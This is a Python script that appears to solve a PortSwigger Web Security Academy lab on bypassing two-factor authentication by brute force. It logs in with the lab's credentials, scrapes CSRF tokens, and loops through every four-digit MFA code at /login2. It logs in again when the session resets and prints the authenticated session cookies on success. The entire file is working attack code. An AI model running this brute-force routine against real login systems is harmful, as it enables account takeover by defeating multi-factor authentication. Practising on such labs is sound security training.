# https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

import requests
import re

url = 'https://....web-security-academy.net'

s = requests.Session()

def login():

    r = s.get(url=f'{url}/login')
    csrf = re.findall(r'name="csrf" value="(.*?)">', r.text)[0]

    login_body = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    r = s.post(url=f'{url}/login', data=login_body)
    assert(len(r.history) == 1 and r.history[0].status_code == 302)

login()
code = 0

while True:

    r = s.get(url=f'{url}/login2')
    csrf = re.findall(r'name="csrf" value="(.*?)">', r.text)[0]

    login2_body = {
        'csrf': csrf,
        'mfa-code': f'{code:04d}'
    }
    r = s.post(url=f'{url}/login2', data=login2_body)
    print(login2_body['mfa-code'])

    if 'Incorrect security code' not in r.text:
        print('Pwned!')
        print(s.cookies)
        break

    elif 'Please enter' not in r.text:
        print('Re-login')
        login()
    
    code += 1
    if code > 9999:
        code = 0
